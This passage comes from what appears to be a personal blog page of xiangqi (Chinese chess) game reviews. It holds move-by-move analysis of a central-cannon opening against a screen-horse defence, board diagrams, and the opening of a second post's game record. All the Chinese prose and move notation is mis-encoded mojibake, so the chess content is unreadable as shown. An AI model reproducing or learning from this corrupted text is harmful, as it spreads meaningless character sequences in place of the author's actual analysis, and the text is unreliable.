<p>II. å› æ­¤æ—¶æœºå°šæœªæˆç†Ÿï¼Œå¦‚æœçº¢æ–¹è¿˜æƒ³è¦ç»´æŒä¸­è·¯æ”»åŠ¿ï¼Œè¿˜æ˜¯å¾—èµ°ç‚®å…«è¿›å››ï¼Œè¿™æ ·å°±èµ°åˆ°äº†å’Œå…ˆèµ°ç‚®å…«è¿›å››åŒæ ·çš„å±€é¢ã€‚ç„¶è€Œæ­¤æ—¶çº¢æ–¹é™¤äº†ç‚®å…«è¿›å››ï¼Œè¿˜æœ‰ä¸¤ç§è¿›æ”»æ‰‹æ®µï¼Œä½†æ˜¯éƒ½ä¸ç†æƒ³ã€‚</p>
<p>a.ç‚®äº”é€€ä¸€ ï¼ˆé¿å…çº¢é©¬å‰è¿›æ¿€æˆ˜æ—¶åç‚®èµ·ç«ï¼‰</p>
<p>b.å…µä¸ƒè¿›ä¸€ ï¼ˆåŸºäºé»‘è½¦1è¿›1ï¼Œåº•è±¡å¤±å®ˆï¼‰</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411004154916.png" alt="image-20250411004154916" style="zoom: 50%;" />

<p>a,ç‚®äº”é€€ä¸€</p>
<p>ç‚®äº”é€€ä¸€å°±æ˜¯é¢„è§åˆ°å½“çº¢é©¬å…­è¿›äº”æ—¶ï¼Œé»‘å…ˆä¸æ¢é©¬ï¼ŒäºŒæ˜¯å…ˆé©¬7è¿›5æ¢ç‚®ã€‚<br>å› æ­¤çº¢æ–¹å…ˆé€€é¿ä¸‰èˆï¼Œé¿å…é»‘é©¬æ¢ç‚®ã€‚	</p>
<pre><code>  8.    ç‚®äº”é€€ä¸€ è±¡7è¿›5		

  9.    é©¬å…­è¿›äº” é©¬3è¿›5

  10.    ç‚®äº”è¿›äº” å£«4è¿›5
</code></pre>
<p>åˆ°æ­¤çº¢ç«‹äº†ä¸€ä¸ªä¸­ç‚®ï¼Œä½†æ˜¯é»‘è½¦å‡ºçš„å¿«ï¼Œçº¢æ–¹ç•¥å¾®ä¼˜åŠ¿ï¼Œå‰è·¯æ¼«é•¿</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411005646904.png" alt="image-20250411005646904" style="zoom:50%;" />

<p>b.å…µä¸ƒè¿›ä¸€</p>
<p>çº¢æ–¹æƒ³çš„æ˜¯é»‘è½¦ç¦»å¼€åº•çº¿ï¼Œåº•è±¡æ²¡äººç®¡ï¼Œå…ˆé€ä¸€ä¸ªå…µç„¶åå¥—ç‚®æ‰“é©¬æ‰“è±¡ã€‚</p>
<p>é»‘æ–¹é©¬é€€çªå¿ƒæ—¶ä¸­ç‚®å†æ‰“è¿‡å»ç«‹å½“å¤´ç‚®ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411010031184.png" alt="image-20250411010031184" style="zoom: 67%;" />

<p>ç„¶è€Œé»‘æ–¹7é©¬éšæ—¶å¯ä»¥æ¢æ‰ä¸­ç‚®ï¼ŒåŒ–è§£çº¢æ–¹ä¸­ç‚®æ”»åŠ¿</p>
<ol start="8">
<li><p>å…µä¸ƒè¿›ä¸€ å’3è¿›1</p>
</li>
<li><p>ç‚®å…«å¹³ä¸ƒ é©¬7è¿›5ï¼</p>
</li>
<li><p>é©¬å…­é€€äº”ï¼ é©¬3é€€5</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411010618723.png" alt="image-20250411010618723" style="zoom:50%;" />

<p>æ³¨æ„åˆ°ç¬¬10å›åˆçº¢æ–¹æ²¡æœ‰ç”¨ç›¸é£é©¬ï¼Œè€Œæ˜¯ç›˜æ²³é©¬æ€å›æ¥ï¼Œ</p>
<p>è¿™æ˜¯å› ä¸ºé»‘æœ‰è½¦1å¹³4å¯¹æŠ“é©¬çš„æ‰‹æ®µã€‚</p>
<p>çº¢æ–¹å¦‚æœç”¨ç›¸é£é©¬ï¼Œé»‘æ–¹åº”è¯¥ç«‹åˆ»å¯¹æŠ“é©¬ã€‚åˆ©ç”¨è¿™ä¸ªå¯¹æŠ“ï¼Œé»‘æ–¹å¯ä»¥è·å¾—ä¸€äº›å…ˆæ‰‹ã€‚</p>
<p>è‹¥é»‘æ–¹è½¯å¼±èµ°é©¬3é€€5ï¼Œåˆ™çº¢é©¬å…­è¿›äº”è¹¬é¼»å­ä¸Šè„¸ä¼˜åŠ¿å·¨å¤§</p>
</blockquote>
<blockquote>
<p>(3)å…µäº”è¿›ä¸€</p>
<p>çº¢æ–¹é‡‡ç”¨æ€¥è¿›ä¸­å…µçš„æ€è·¯ã€‚</p>
<p>æ€¥è¿›ä¸­å…µå±€é¢å¦‚å³å›¾æ‰€ç¤ºï¼Œè€Œå½“å‰å±€é¢å¦‚å·¦å›¾æ‰€ç¤ºã€‚</p>
<p>å·¦å›¾ä¸­çº¢æ–¹å·¦é©¬å·²ç»è·³èµ·ï¼Œé»‘å·¦é©¬ä»¥ç¦»å¼€é˜²åŠ¡ï¼Œå±é£é©¬ç»“æ„é­åˆ°ç ´åï¼Œ2è·¯æ— æ ¹è½¦ç‚®è¢«ç‰µåˆ¶ã€‚</p>
<p>å› æ­¤ç›¸æ¯”äºæ€¥è¿›ä¸­å…µæ ‡å‡†æ£‹è°±ï¼Œå½“å‰å±€é¢ä¸‹çº¢æ–¹çš„ä¼˜åŠ¿æ›´å¤§ã€‚</p>
<p>å¦‚æœè¯´æ€¥è¿›ä¸­å…µåŒæ–¹å„æœ‰åƒç§‹ï¼Œé‚£ä¹ˆå½“å‰å±€é¢ä¸‹çº¢æ–¹çš„åƒç§‹è²Œä¼¼æ›´å¤šä¸€ç‚¹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411011902184.png" alt="å·¦ï¼šå½“å‰å±€é¢  å³ï¼šæ€¥è¿›ä¸­å…µ"></p>
<ol start="7">
<li><p>å…µäº”è¿›ä¸€ å£«4è¿›5ï¼Œ æ­¤æ—¶ä¸èƒ½é©¬7é€€5è¸©å…µå› ä¸ºçº¢å¯ä»¥ç‚®å…«è¿›äºŒæ‰“æ­»é©¬</p>
</li>
<li><p>é©¬ä¸‰è¿›äº”ï¼ è±¡3è¿›5ï¼Œç›´æ¥æŠ¬æ¨ªè½¦å’Œå‡ºè´´èº«è½¦ä¸€æ ·å¿«ï¼Œèƒ½å¤šä¸Šæ­¥è±¡æ›´å¥½</p>
</li>
<li><p>å…µäº”è¿›ä¸€ â€¦</p>
</li>
</ol>
<p>æ­¤æ—¶é»‘æ–¹æœ‰ä¸¤ç§èµ°æ³•ï¼Œå’5è¿›1&#x2F;è½¦1å¹³4</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411014313402.png" alt="image-20250411014313402" style="zoom:50%;" />

<p>I.å’5è¿›1</p>
<ol start="9">
<li><p>å…µäº”è¿›ä¸€ å’5è¿›1</p>
</li>
<li><p>ç‚®äº”è¿›ä¸‰ è½¦1å¹³4</p>
</li>
<li><p>è½¦ä¹è¿›ä¸€ è½¦4è¿›6ï¼Œé»‘æ–¹æ¥ä¸‹æ¥æƒ³è¦ç‚®2è¿›4æ‰“çº¢é©¬</p>
</li>
<li><p>è½¦ä¹å¹³ä¸‰ï¼ é©¬7é€€5 ï¼Œçº¢æ–¹å…ˆæŠ“é©¬ï¼Œé»‘æ–¹æ¥ä¸åŠå¥—ç‚®æ‰“é©¬ï¼Œå› æ­¤çº¢è½¦æ€é©¬ä¹‹åå°±çœ‹ä½äº†çº¢é©¬</p>
</li>
<li><p>ç‚®å…«è¿›äºŒï¼ é©¬5è¿›3ï¼Œ çº¢ç‚®æ‰“é©¬åˆå¾—åˆ°å…ˆæ‰‹ï¼Œè°ƒæ•´äº†ç‚®ä½ï¼Œä¹Ÿé˜»æ­¢äº†é»‘2è·¯ç‚®æ¸—é€çš„å¯èƒ½ã€‚</p>
</li>
<li><p>è½¦ä¸‰è¿›å›› å°†5å¹³4</p>
</li>
</ol>
<p>è‡³æ­¤çº¢æ–¹è·å¾—å·¨å¤§ä¼˜åŠ¿ï¼Œæ¥ä¸‹æ¥è½¦ä¸‰é€€ä¸€ï¼Œç‚®äº”å¹³å››å†é€€äºŒæ‰“æ­»é©¬ã€‚æ³¨æ„è¿™é‡Œé»‘æ–¹å¯èƒ½åŸ‹ä¼ä¸€ä¸ªè½¯ä»¶æ‹›</p>
<ol start="15">
<li><p>è½¦ä¸‰é€€ä¸€ å’1è¿›1ï¼Œå‡è®¾é»‘æ–¹éšä¾¿èµ°äº†æ— å…³ç´§è¦çš„ä¸€æ­¥</p>
</li>
<li><p>ç‚®äº”å¹³å›› è±¡5è¿›7ï¼ï¼Œè¿™æ­¥é£è±¡è®©äººå¾ˆéš¾ç†è§£å…¶ç›®çš„ </p>
</li>
<li><p>ç‚®äº”é€€äºŒï¼Ÿ è½¦4å¹³5ï¼ï¼Œé»‘è½¦ä¸ºä»€ä¹ˆæ•¢æ¢é©¬ï¼Ÿ</p>
</li>
<li><p>é©¬ä¸ƒè¿›äº” ç‚®8å¹³5ï¼ï¼ŒåŸæ¥ä¹‹å‰é»‘æ–¹è¯¡å¼‚çš„é£è±¡ï¼Œæ˜¯ç»™ä¸­ç‚®è…¾åœ°æ–¹ï¼ŒæŠ½åƒçº¢äºŒè·¯è½¦</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411020301215.png" alt="image-20250411020301215" style="zoom:67%;" />

<p>II. è½¦1å¹³4</p>
<p>é»‘æŠ¢å‡ºè½¦ï¼Œä¸ç®¡ä¸­è·¯</p>
<ol start="9">
<li><p>å…µäº”è¿›ä¸€ è½¦1å¹³4</p>
</li>
<li><p>å…µäº”è¿›ä¸€ è½¦4è¿›6ï¼Œé»‘æ–¹æ¥ä¸‹æ¥è¦ç‚®2è¿›4æ‰“é©¬äº†</p>
</li>
</ol>
<p>çº¢æ–¹çœ‹èµ·æ¥æœ‰å¾ˆå¤šèµ°æ³•ï¼Œ</p>
<p>ç‚®å…«è¿›äºŒ&#x2F;è½¦ä¹è¿›ä¸€&#x2F;ç‚®äº”å¹³å››&#x2F;å…µäº”è¿›ä¸€</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411021152270.png" alt="image-20250411021152270" style="zoom:50%;" />

<p>â‘  ç‚®å…«è¿›äºŒæ˜¯é”™ç€ï¼Œé»‘é©¬7è¿›6åŒæ—¶è¸©çº¢é©¬ï¼ŒæŒ‚è§’ã€‚çº¢é©¬äº”è¿›å››åé»‘é©¬6é€€4æŒ‚è§’å°†å†›ï¼Œè¯·å¸…ä¸Šæ¥¼ã€‚ç„¶åé»‘å³é©¬ä»—åŠ¿æ¬ºäººå¾€ä¸Šè·³ï¼Œçº¢å¦‚æœåƒé»‘é©¬åˆ™é»‘å·¦ä¾§è½¦ç‚®å¯ä»¥ä¸‹åº•å¨èƒ</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411021635359.png" alt="image-20250411021635359" style="zoom:50%;" />

<p>â‘¡è½¦ä¹è¿›ä¸€ä¹Ÿæ˜¯é”™ç€ï¼Œé»‘æ–¹ç‚®2è¿›4å¾—å­</p>
<p>â‘¢ç‚®äº”å¹³å››æ˜¯æ­£ç€ï¼Œé»‘æ¥ä¸åŠå¥—ç‚®ï¼Œå› ä¸ºçº¢ä¹Ÿå¯ä»¥å¥—ç‚®æ‰“è½¦</p>
<ol start="11">
<li>ç‚®äº”å¹³å›› å’3è¿›1ï¼Œé»‘çœ‹ä¼¼æ— æ£‹å¯èµ°ï¼Œäºæ˜¯å†²3å’æ´»é©¬ã€‚ç„¶è€Œé»‘çš„ç›®çš„çœŸçš„æ˜¯æ´»ğŸå—ï¼Ÿ</li>
</ol>
<p>å‡è®¾çº¢æ–¹æ²¡æœ‰å¯Ÿè§‰é»‘æ„å›¾ï¼Œæ¥æ”¶äº†å…‘å…µï¼Œå…ˆèµ°äº†å…µä¸ƒè¿›ä¸€ï¼š</p>
<ol start="12">
<li><p>å…µä¸ƒè¿›ä¸€ è±¡5è¿›3</p>
</li>
<li><p>ç‚®å››é€€ä¸€ è½¦4é€€5</p>
</li>
<li><p><strong>è½¦ä¹è¿›ä¸€</strong> ç‚®2è¿›1ï¼ï¼Œæ‰“è½¦ï¼</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411022937850.png" alt="image-20250411022937850" style="zoom:67%;" />

<p>å¦‚æœçº¢å…µäº”è¿›ä¸€ï¼Œåˆ™é»‘ç‚®2å¹³5å°†å†›ï¼Œç„¶åè±¡3é€€5ç™½å‘ä¸€å…µ</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023115040.png" alt="image-20250411023115040" style="zoom: 67%;" />

<p>å¦‚æœçº¢è½¦äºŒé€€ä¸‰ï¼Œæƒ³è¦æ‰ä¸€æ‰¹æ­»é©¬ï¼Œç„¶è€Œè‡ªå·±æˆäº†æ­»è½¦<br>â€‹è½¦äºŒé€€ä¸‰ï¼Œé©¬3è¿›5<br>â€‹è½¦äºŒå¹³ä¸‰ï¼Œç‚®8å¹³7ï¼ï¼Œæ‰“æ­»çº¢è½¦</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023216340.png" alt="image-20250411023216340" style="zoom: 67%;" />

<p>é‚£ä¹ˆçº¢åœ¨ç¬¬14å›åˆä¸èµ°è½¦ä¹è¿›ä¸€èƒ½æŒ½æ•‘å—ï¼Ÿ<br>èµ°å…µäº”å¹³å…­ï¼Œå½“ç‚®2è¿›1æ—¶ï¼Œå†å…µå…­è¿›ä¸€å¾—å­ä¸è¡Œå—ï¼Ÿ<br>ç„¶è€Œæ­¤æ—¶é»‘ä¸­è±¡å·²ç»é£ç¦»äº†ï¼Œè…¾å‡ºäº†ç‚®ä½ï¼Œé»‘å¯ä»¥å¹³ç‚®å°†å†›æŠ½è½¦</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023534773.png" alt="image-20250411023534773" style="zoom: 67%;" />

<p>è¿™ä¸­è±¡ä»€ä¹ˆæ—¶å€™é£ç¦»çš„ï¼Ÿ</p>
<p>åœ¨ç¬¬11å›åˆæ—¶é»‘å’3è¿›1å…‘å…µï¼Œ</p>
<p>åœ¨ç¬¬12å›åˆçº¢æ¥æ”¶äº†å…‘å…µï¼Œå¯¼è‡´é»‘æ–¹é£é«˜è±¡ã€‚</p>
<p>è¿™æ ·å°±ç†è§£äº†é»‘å†²3å’çš„çœŸæ­£ç›®çš„ï¼Œæ˜¯ä¸€ä¸ªåœˆå¥—ã€‚</p>
<p>ä¸€æ—¦çº¢æ–¹ä¸Šå¥—åˆ™å±€åŠ¿é€†è½¬ã€‚</p>
<p>ç¬¬14å›åˆçº¢å¦‚æœä¸èµ°è½¦ä¹è¿›ä¸€ï¼Œæ”¹èµ°è±¡ä¸ƒè¿›äº”ä¹Ÿå¯ä»¥é™ä½æŸå¤±ï¼Œ</p>
<p>æ­¤æ—¶çº¢æ–¹å¹³ä¸­ç‚®æ²¡æœ‰å°†å†›çš„å…ˆæ‰‹ï¼Œ</p>
<p>é»‘éœ€è¦å…ˆèº²ä¸€æ­¥ç‚®ï¼Œçº¢å…µå¯ä»¥å†å•ƒä¸€ä¸ªä¸­å£«</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411025142742.png" alt="image-20250411025142742" style="zoom: 67%;" />

<p>ç„¶è€Œå½“çº¢é£ä¸­è±¡åï¼Œé»‘ä¹ŸçŸ¥é“åœˆå¥—ä½œç”¨ä¸å¤§äº†ï¼Œä¹Ÿä¸ä¼šå†ç‚®2è¿›1ï¼Œ</p>
<p>è€Œæ˜¯æ”¹èµ°å’7è¿›1 ï¼Œå‡†å¤‡å¹³6å¨èƒçº¢ç‚®çº¢é©¬</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411025432076.png" alt="image-20250411025432076" style="zoom: 67%;" />

<p>ä¹Ÿå°±æ˜¯è¯´ç¬¬14å›åˆï¼Œçº¢æŠ¬çº¢è½¦åˆ™è½å…¥é»‘æ–¹åœˆå¥—ã€‚çº¢é£ä¸­è±¡åˆ™é»‘è¿‡å…µåå‡»ã€‚</p>
<p>æ€»ä¹‹ç¬¬12å›åˆçº¢æ¥æ”¶å…‘å…µå°±è¢«é»‘æ–¹ç®—è®¡äº†</p>
<ol start="12">
<li>ç‚®å››è¿›ä¸€ï¼Œè½¦4é€€6ï¼ï¼Œæ³¨æ„è¿™é‡Œé»‘è½¦é€€6ï¼Œè€Œåœ¨åˆšæ‰çš„åœˆå¥—é‡Œé»‘è½¦é€€5</li>
</ol>
<p>è¿™æ˜¯ä¸ºäº†é˜²æ­¢çº¢å…µäº”å¹³å…­å†è¿›ä¸€æ‹±åˆ°é»‘è½¦ï¼Œæ‰€ä»¥ä»–è·‘çš„è¿œä¸€ç‚¹å„¿</p>
<p>æ­¤æ—¶æœ‰ä¸¤ç§èµ°æ³•ï¼šå…µäº”å¹³å…­&#x2F;å…µä¸ƒè¿›ä¸€</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411024337199.png" alt="image-20250411024337199" style="zoom: 67%;" />

<p>å¦‚æœèµ°å…µä¸ƒè¿›ä¸€ï¼Œ</p>
<ol start="13">
<li>å…µä¸ƒè¿›ä¸€ è±¡5è¿›3ï¼Œè…¾å‡ºäº†ç‚®ä½</li>
</ol>
<p>è±¡ä¸ƒè¿›äº” ç‚®2è¿›1ï¼Œå’Œåˆšæ‰çš„åœˆå¥—ä¸€æ¨¡ä¸€æ ·</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411024822521.png" alt="image-20250411024822521" style="zoom: 67%;" />

<p>å¦‚æœèµ°å…µäº”å¹³å…­</p>
<ol start="13">
<li><p>å…µäº”å¹³å…­ å’3è¿›1</p>
</li>
<li><p>å…µå…­å¹³ä¸ƒï¼ é©¬3é€€2</p>
</li>
</ol>
<p>çº¢å…µå…­å¹³ä¸ƒå‹é©¬æ˜¯æ­£æ‰‹ï¼Œé»‘3å’å¹¶ä¸ç€æ€¥åƒï¼Œä»–ä¹Ÿå†²ä¸ä¸‹æ¥ï¼Œå› ä¸ºçº¢å››è·¯ç‚®æ¶ç€å‘¢ã€‚è€Œçº¢å…µå…­å¹³ä¸ƒå‹é©¬å°±é˜²æ­¢äº†é»‘é©¬3è¿›4å‡ºæ¥éªšæ‰°ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411030414492.png" alt="image-20250411030414492" style="zoom: 67%;" />

<ol start="15">
<li><p>é©¬äº”è¿›ä¸ƒ å’7è¿›1 ï¼Œåˆ°æ­¤çº¢æ–¹å·²ç»å–å¾—å·¨å¤§ä¼˜åŠ¿</p>
</li>
<li><p>ç›´æ¥å…µäº”å¹³å…­è¡Œä¸è¡Œï¼Ÿ</p>
</li>
</ol>
<p>ä¸ºä»€ä¹ˆä¸€å®šè¦å…ˆç‚®å››è¿›ä¸€èµ¶èµ°é»‘è½¦å†å…µäº”å¹³å…­ï¼Ÿ</p>
<p>ç›´æ¥å¹³è¡Œä¸è¡Œï¼Ÿ</p>
<p>ä¸è¡Œï¼</p>
<ol start="12">
<li>å…µäº”å¹³å…­ è±¡5é€€3ï¼é©¬ä¸Šå°±è¦ç‚®8å¹³5æŠ½çº¢è½¦ï¼çº¢å¿…é¡»è¡¥è±¡</li>
<li>è±¡ä¸ƒè¿›äº” ç‚®2è¿›4ï¼æ­¤æ—¶ç‚®æ‰“é©¬å¸¦å°†å†›ï¼Œçº¢æ–¹æ¥ä¸åŠç‚®å››è¿›ä¸€æ‰“è½¦äº†ï¼</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411031038939.png" alt="image-20250411031038939" style="zoom: 67%;" />

<p>â‘£å…µäº”è¿›ä¸€ç»§ç»­å†²</p>
<ol start="11">
<li>å…µäº”è¿›ä¸€ è±¡7è¿›5ï¼Œé»‘æ–¹å¿…é¡»å¾—é£çº¢å…µï¼Œå¦åˆ™ä»–ç‹ ç‹ æ…è¿›æ¥äº†å—ä¸äº†</li>
<li>ç‚®å…«å¹³ä¹ ç‚®2è¿›4ï¼Ÿ å‡è®¾é»‘æ–¹è®¤ä¸ºä»ç„¶å¯ä»¥å¥—ç‚®æ‰“çº¢ä¸­é©¬</li>
<li>ç‚®äº”è¿›äº”ï¼å°†5å¹³4</li>
<li>å£«å…­è¿›äº”ï¼ç‚®2å¹³5ï¼Œ è¿™é‡Œçº¢<strong>è¡¥å£«æ˜¯æ­£ç¡®çš„ï¼Œè¡¥è±¡å°±åäº†</strong>ï¼Œåé¢é»‘å¯ä»¥ä¸€é©¬æ¢åŒè±¡ç„¶ååŒè½¦å€Ÿå°†ç ´åŒå£«ã€‚</li>
<li>é©¬ä¸ƒè¿›äº” è½¦4å¹³5</li>
<li>è½¦äºŒå¹³å…­ï¼å£«5è¿›4ï¼Œç”±äºçº¢ç‚®å½“å¤´ï¼Œé»‘å°†æ²¡æ³•å›å»ï¼Œåªèƒ½è¡¥å£«</li>
<li>ç‚®äº”å¹³ä¸ƒ ç‚®8å¹³3</li>
<li>è½¦å…­è¿›ä¸€ å°†4å¹³5</li>
<li>è½¦å…­å¹³ä¸ƒ  å¾—å›å¤±å­</li>
</ol>
</blockquote>
<ol start="7">
<li><p>ç‚®å…«è¿›å›› è±¡ï¼—è¿›ï¼•</p>
</li>
<li><p>ç‚®äº”è¿›å›› å£«4è¿›5</p>
</li>
</ol>
<blockquote>
<p>æ¥ä¸‹æ¥çº¢æ–¹ä¸ºäº†ä¿æŒæ”»åŠ¿ï¼Œåº”è¯¥ç‚®äº”é€€ä¸€ï¼Œé¿å…é©¬è¸©ã€‚<strong>åŒæ—¶ä¸€ä¸ªæ–°çš„ä½œæˆ˜è®¡åˆ’æµ®å‡ºæ°´é¢ã€‚</strong></p>
<p>å¦‚æœè¿™ä¸€æ­¥é»‘æ–¹æ²¡æœ‰å¯Ÿè§‰ï¼Œæ¯”å¦‚éšæ‰‹æŠ¬å³æ¨ªè½¦ï¼Œåˆ™çº¢å…µä¸ƒè¿›ä¸€ï¼Œå¼•è¯±é»‘å’3è¿›1ç™½å¾—ä¸€å…µã€‚</p>
<p>ç‚®å…«å¹³ä¸‰ï¼Œæ‰“é©¬</p>
<p>å’7è¿›1ï¼Œçœ‹é©¬</p>
<p>è½¦äºŒè¿›ä¸€ï¼Œç¡¬ç ç‚®ï¼Œå¦‚æœé»‘è½¦8è¿›2æ€çº¢è½¦åˆ™çº¢ç‚®ä¸‰è¿›ä¸‰ï¼Œå¤©åœ°ç‚®é—·å®«ã€‚</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410222421895.png" alt="image-20250410222421895" style="zoom: 67%;" />

<p>å®Œæ•´æ¨æ¼”ï¼š</p>
<ol start="9">
<li><p>ç‚®äº”é€€ä¸€ è½¦1è¿›1ï¼Ÿ</p>
</li>
<li><p>å…µä¸ƒè¿›ä¸€ï¼ å’3è¿›1</p>
</li>
<li><p>ç‚®å…«å¹³ä¸‰ï¼å’7è¿›1</p>
</li>
<li><p>è½¦äºŒè¿›ä¸€ï¼ è½¦8å¹³7</p>
</li>
<li><p>ç‚®ä¸‰è¿›ä¸€ï¼æ‰“ä¸²ï¼</p>
</li>
</ol>
<p>ä¹Ÿå°±æ˜¯è¯´ç¬¬9å›åˆï¼Œé»‘æ–¹å¿…é¡»èµ°å‡ºå…³é”®çš„ä¸€æ­¥ï¼Œé©¬3é€€4ï¼Œå½¢æˆæ‹…å­ç‚®ä¸æ€•çº¢äºŒè·¯è½¦æ€ç‚®äº†ã€‚</p>
<p>ç„¶è€Œè¿™æ­¥æˆ‘æ˜¯æƒ³ä¸åˆ°çš„ã€‚</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/11/[%E8%B1%A1%E6%A3%8B%E5%A4%8D%E7%9B%98]%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%20%E5%AF%B9%20%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/11/%5B%E8%B1%A1%E6%A3%8B%E5%A4%8D%E7%9B%98%5D%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%20%E5%AF%B9%20%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/" class="post-title-link" itemprop="url">ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µ å¯¹ å±é£é©¬å·¦é©¬ç›˜æ²³ çº¢ä¸ƒè·¯é©¬ å¤ç›˜</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-11 03:00:00 / Modified: 03:36:20" itemprop="dateCreated datePublished" datetime="2025-04-11T03:00:00+08:00">2025-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å¤ç›˜-ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µ-å¯¹-å±é£é©¬å·¦é©¬ç›˜æ²³-çº¢ä¸ƒè·¯é©¬"><a href="#å¤ç›˜-ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µ-å¯¹-å±é£é©¬å·¦é©¬ç›˜æ²³-çº¢ä¸ƒè·¯é©¬" class="headerlink" title="[å¤ç›˜] ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µ å¯¹ å±é£é©¬å·¦é©¬ç›˜æ²³ - çº¢ä¸ƒè·¯é©¬"></a>[å¤ç›˜] ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µ å¯¹ å±é£é©¬å·¦é©¬ç›˜æ²³ - çº¢ä¸ƒè·¯é©¬</h1><h2 id="å¯¹å±€è®°å½•"><a href="#å¯¹å±€è®°å½•" class="headerlink" title="å¯¹å±€è®°å½•"></a>å¯¹å±€è®°å½•</h2><ol>
<li>ç‚®äºŒå¹³äº” é©¬ï¼˜è¿›ï¼—</li>
<li>é©¬äºŒè¿›ä¸‰ å’ï¼—è¿›ï¼‘</li>
<li>è½¦ä¸€å¹³äºŒ è½¦ï¼™å¹³ï¼˜</li>
<li>è½¦äºŒè¿›å…­ é©¬ï¼’è¿›ï¼“</li>
<li>å…µä¸ƒè¿›ä¸€ é©¬ï¼—è¿›ï¼–</li>
<li>é©¬å…«è¿›ä¸ƒ å’ï¼—è¿›ï¼‘</li>
<li>è½¦äºŒå¹³å›› é©¬ï¼–è¿›ï¼˜</li>
<li>å…µä¸‰è¿›ä¸€ é©¬ï¼˜è¿›ï¼—</li>
<li>ç‚®äº”è¿›å›› é©¬ï¼“è¿›ï¼•</li>
<li>è½¦å››å¹³äº” ç‚®ï¼˜å¹³ï¼•</li>
<li>ç‚®å…«å¹³ä¸‰ ç‚®ï¼’è¿›ï¼‘</li>
<li>è½¦äº”é€€äºŒ ç‚®ï¼’é€€ï¼’</li>
<li>ç›¸ä¸ƒè¿›äº” ç‚®ï¼’å¹³ï¼•</li>
<li>è½¦äº”å¹³å›› è½¦ï¼‘å¹³ï¼’</li>
<li>è½¦ä¹è¿›ä¸€ è±¡ï¼—è¿›ï¼™</li>
<li>è½¦ä¹å¹³å…­ è½¦ï¼’è¿›ï¼–</li>
<li>è½¦å››å¹³å…­ åç‚®è¿›ï¼•</li>
<li>é©¬ä¸ƒè¿›äº” å£«ï¼–è¿›ï¼•</li>
<li>åè½¦è¿›äºŒ è½¦ï¼’è¿›ï¼’</li>
<li>ä»•å…­è¿›äº” è½¦ï¼˜è¿›ï¼–</li>
<li>é©¬äº”è¿›å›› è½¦ï¼’è¿›ï¼‘</li>
<li>åè½¦é€€ä¸‰ è½¦ï¼’å¹³ï¼”</li>
<li>å¸…äº”å¹³å…­ ç‚®ï¼•å¹³ï¼”</li>
<li>è½¦å…­å¹³äº” è½¦ï¼˜å¹³ï¼‘</li>
<li>é©¬å››è¿›äºŒ è½¦ï¼‘è¿›ï¼“</li>
<li>å¸…å…­è¿›ä¸€ ç‚®ï¼”é€€ï¼‘</li>
<li>é©¬äºŒè¿›å››</li>
</ol>
<h2 id="å¤ç›˜åˆ†æ"><a href="#å¤ç›˜åˆ†æ" class="headerlink" title="å¤ç›˜åˆ†æ"></a>å¤ç›˜åˆ†æ</h2><ol>
